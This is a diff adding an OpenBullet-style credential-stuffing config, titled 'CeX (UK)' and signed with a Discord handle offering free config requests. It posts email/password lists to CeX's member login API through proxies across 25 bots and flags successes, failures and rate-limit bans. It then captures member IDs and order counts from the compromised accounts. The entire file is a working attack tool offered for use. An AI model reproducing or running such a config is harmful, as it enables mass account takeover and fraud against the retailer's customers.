@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "CeX (UK)",
+  "SuggestedBots": 25,
+  "LastModified": "2018-12-18T01:12:29.4407836+00:00",
+  "AdditionalInfo": "",
+  "Author": "VXR",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Discord_vxr#5146_(Free_config_requests) REQUEST POST "https://wss2.cex.uk.webuy.io/v3/members/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Discord_vxr#5146_(Free_config_requests) KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"Failure\",\"" 
+  KEYCHAIN Success OR 
+    KEY "Success\",\"" 
+  KEYCHAIN Ban OR 
+    KEY "429 Too Many Requests" 
+PARSE "<SOURCE>" LR "\":{\"memberId\":" "}" Recursive=FALSE -> CAP "member ID: " "" "" 
+#Discord_vxr#5146_(Free_config_requests) REQUEST GET "https://uk.webuy.com/user/orderTracking" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "Buy-From-CeX Order Tracking</div></div><div class=\"trackingFeatureBoxContent\"><div style=\"text-align:center\"><br><p>Here you can track your active orders to see how things are moving along. You can also click on the order to show the details of each item.</p><br></div><div class=\"trackingPaginationLinks\"><span class=\"trackingPaginationText\"><span class=\"bold\">" "</span>" Recursive=FALSE -> CAP "Purchased Orders" "" "" 
+PARSE "<SOURCE>" LR "Sell-To-CeX Order Tracking</div></div><div class=\"trackingFeatureBoxContent\"><div style=\"text-align:center\"><br><p>Here you can track your active orders to see how things are moving along. You can also click on the order to show the details of each item.</div></div><div class=\"trackingPaginationLinks\"><span class=\"trackingPaginationText\"><span class=\"bold\">" "</span>" Recursive=FALSE -> CAP "Selling Orders" "" "" 
